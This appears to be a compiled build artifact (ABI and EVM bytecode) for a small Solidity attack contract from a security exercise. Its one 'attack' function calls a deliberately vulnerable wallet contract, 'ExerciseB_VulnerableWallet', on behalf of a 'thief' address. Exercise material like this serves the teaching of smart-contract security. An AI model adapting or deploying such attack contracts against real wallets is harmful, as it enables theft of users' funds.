{"abi":[{"type":"function","name":"attack","inputs":[{"name":"target","type":"address","internalType":"contract ExerciseB_VulnerableWallet"},{"name":"thief","type":"address","internalType":"address payable"}],"outputs":[],"stateMutability":"nonpayable"}],"bytecode":{"object":"0x608060405234801561000f575f80fd5b506101e88061001d5f395ff3fe608060405234801561000f575f80fd5b5060043610610029575f3560e01c80633c48664c1461002d575b5f80fd5b6100476004803603810190610042919061014c565b610049565b005b8173ffffffffffffffffffffffffffffffffffffffff1663a3a7e7f3826040518263ffffffff1660e01b81526004016100829190610199565b5f604051808303815f87803b158015610099575f80fd5b505af11580156100ab573d5f803e3d5ffd5b505050505050565b5f80fd5b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f6100e0826100b7565b9050919050565b5f6100f1826100d6565b9050919050565b610101816100e7565b811461010b575f80fd5b50565b5f8135905061011c816100f8565b92915050565b61012b816100d6565b8114610135575f80fd5b50565b5f8135905061014681610122565b92915050565b5f8060408385031215610162576101616100b3565b5b5f61016f8582860161010e565b925050602061018085828601610138565b9150509250929050565b610193816100d6565b82525050565b5f6020820190506101ac5f83018461018a565b9291505056fea26469706673582212205498a6e2fe873a84be2194822ab1e2c94b191f51f08823a5faded06034bebfab64736f6c63430008180033","linkReferences":{}},"methodIdentifiers":{"attack(address,address)":"3c48664c"},"id":35}